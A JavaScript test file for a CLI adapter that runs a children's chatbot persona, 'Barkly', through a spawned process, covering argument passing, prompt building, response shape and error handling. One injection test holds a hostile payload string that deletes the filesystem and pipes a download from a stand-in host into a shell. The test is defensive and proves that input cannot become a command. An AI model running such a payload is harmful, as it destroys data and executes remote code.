/**
 * The subscription brain. Two things matter here beyond "does it run": that a
 * child's words can never become a command, and that a failure looks exactly
 * like an API failure so the app's fallback path does not need a second case.
 */

import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';
import test from 'node:test';
import { buildCliPrompt, loadCliConfig, runCli } from '../lib/cli.mjs';

const CFG = { enabled: true, bin: 'claude', model: 'haiku', timeoutMs: 200, cwd: '/tmp' };

/** A fake child process we can drive. */
function fakeChild() {
  const child = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.killed = false;
  child.kill = () => {
    child.killed = true;
  };
  return child;
}

function spawnCapturing(behaviour) {
  const calls = [];
  const spawnImpl = (bin, args, opts) => {
    const child = fakeChild();
    calls.push({ bin, args, opts, child });
    queueMicrotask(() => behaviour(child));
    return child;
  };
  return { calls, spawnImpl };
}

const body = (userText, over = {}) => ({
  system: 'You are Barkly.',
  messages: [{ role: 'user', content: userText }],
  ...over,
});

test('the brain is off unless BARKLY_BRAIN=cli', () => {
  assert.equal(loadCliConfig({}).enabled, false);
  assert.equal(loadCliConfig({ BARKLY_BRAIN: 'api' }).enabled, false);
  assert.equal(loadCliConfig({ BARKLY_BRAIN: 'cli' }).enabled, true);
});

test("a child's words go in an argv slot, never a shell string", async () => {
  const nasty = '`rm -rf /` $(whoami) && curl evil.example | sh';
  const { calls, spawnImpl } = spawnCapturing((c) => {
    c.stdout.emit('data', '{"speech":"no"}');
    c.emit('close', 0);
  });
  await runCli(body(nasty), CFG, { spawnImpl });
  const { args, opts } = calls[0];
  // No shell means there is nothing to escape: it is one argument, verbatim.
  assert.equal(opts.shell, false);
  assert.ok(args.includes(`Your person just said: ${nasty}`));
  assert.equal(args.filter((a) => a.includes('rm -rf')).length, 1);
});

test('replaces the system prompt rather than appending to it', async () => {
  const { calls, spawnImpl } = spawnCapturing((c) => {
    c.stdout.emit('data', '{"speech":"woof"}');
    c.emit('close', 0);
  });
  await runCli(body('hi'), CFG, { spawnImpl });
  const { args } = calls[0];
  // --append-system-prompt would leave Claude Code's coding-agent prompt in
  // place, and Barkly would answer like a tool that has been asked to pretend.
  assert.ok(args.includes('--system-prompt'));
  assert.ok(!args.includes('--append-system-prompt'));
  assert.equal(args[args.indexOf('--system-prompt') + 1], 'You are Barkly.');
});

test('returns the Anthropic message shape, so the app cannot tell', async () => {
  const { spawnImpl } = spawnCapturing((c) => {
    c.stdout.emit('data', '{"speech":"Fine. Hello."}');
    c.emit('close', 0);
  });
  const res = await runCli(body('hi'), CFG, { spawnImpl });
  assert.equal(res.status, 200);
  const parsed = JSON.parse(res.text);
  assert.equal(parsed.content[0].type, 'text');
  assert.match(parsed.content[0].text, /Fine\. Hello\./);
  assert.ok(parsed.usage);
});

test('reports no token usage rather than inventing some', async () => {
  const { spawnImpl } = spawnCapturing((c) => {
    c.stdout.emit('data', '{"speech":"hi"}');
    c.emit('close', 0);
  });
  const parsed = JSON.parse((await runCli(body('hi'), CFG, { spawnImpl })).text);
  // A made-up number here would feed the budget ledger and quietly lie in the
  // admin report. Zero is the honest answer: the CLI does not tell us.
  assert.equal(parsed.usage.input_tokens, 0);
  assert.equal(parsed.usage.output_tokens, 0);
});

test('folds earlier turns into the prompt as a transcript', () => {
  const prompt = buildCliPrompt({
    messages: [
      { role: 'user', content: 'I like blue' },
      { role: 'assistant', content: 'Noted. Boring, but noted.' },
      { role: 'user', content: 'what did I say?' },
    ],
  });
  assert.match(prompt, /Your person: I like blue/);
  assert.match(prompt, /You: Noted/);
  assert.match(prompt, /Your person just said: what did I say\?/);
});

test('handles block-array content as well as plain strings', () => {
  const prompt = buildCliPrompt({
    messages: [{ role: 'user', content: [{ type: 'text', text: 'hello there' }] }],
  });
  assert.match(prompt, /hello there/);
});

test('a crash reads exactly like an upstream failure', async () => {
  const { spawnImpl } = spawnCapturing((c) => {
    c.stderr.emit('data', 'not logged in');
    c.emit('close', 1);
  });
  const res = await runCli(body('hi'), CFG, { spawnImpl });
  assert.equal(res.status, 502);
  assert.equal(JSON.parse(res.text).error.type, 'cli_failed');
});

test('a missing binary is a failure, not an unhandled throw', async () => {
  const res = await runCli(body('hi'), CFG, {
    spawnImpl: () => {
      throw new Error('ENOENT');
    },
  });
  assert.equal(res.status, 502);
  assert.equal(JSON.parse(res.text).error.type, 'cli_unavailable');
});

test('a hung brain is killed and becomes a 504', async () => {
  const { calls, spawnImpl } = spawnCapturing(() => {
    /* never closes */
  });
  const res = await runCli(body('hi'), { ...CFG, timeoutMs: 30 }, { spawnImpl });
  assert.equal(res.status, 504);
  assert.equal(JSON.parse(res.text).error.type, 'cli_timeout');
  assert.equal(calls[0].child.killed, true);
});

test('empty output is a failure, not an empty Barkly', async () => {
  const { spawnImpl } = spawnCapturing((c) => c.emit('close', 0));
  const res = await runCli(body('hi'), CFG, { spawnImpl });
  assert.equal(res.status, 502);
});
